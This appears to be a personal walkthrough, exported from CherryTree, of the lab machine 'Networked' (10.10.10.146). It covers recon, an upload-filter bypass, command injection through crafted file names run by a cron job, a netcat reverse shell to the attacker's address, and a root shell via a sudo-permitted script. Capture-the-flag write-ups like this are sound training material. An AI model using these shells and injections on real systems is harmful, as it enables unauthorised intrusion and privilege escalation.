<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.146 Networked</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.146 Networked</h1><br/>nmap showed that 22, and 80 were open<br />dirsearch showed a backup.tar direcory which showed that there was an upload.php directory<br />in backup.tar it also showed that the upload needed to be a gif, have the magic byte, and be less that 60000 bytes.<br />user shell!! ...as apache... lame<br /><br />after the usual privesc stuff puttered out I found a file that ran as a cron job in a users dir<br />this line let me make a file a guly (the user)<br />    exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);<br /> I was able to write to file by<br />    cd /var/www/html/uploads/<br />    touch bullshit;touch yee;chmod 777 yee<br />onece yee was created I added<br />    #!/bin/bash<br />    nc 10.10.14.60 3232 -e /bin/bash<br />now that the file has been edited and I started a listener<br />    touch bullshit;bash yee<br />yee has been executed!!!<br />we are now guly!!<br /><br />sudo -l shows that we can run /usr/local/sbin/changename.sh as root!<br />if a config runs letting you change either of these simply answer<br />bullshit /bin/bash -i<br />bullshit<br />bullshit<br />bullshit<br /><br /><br />you are now root!<br /><br /><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></div></body></html>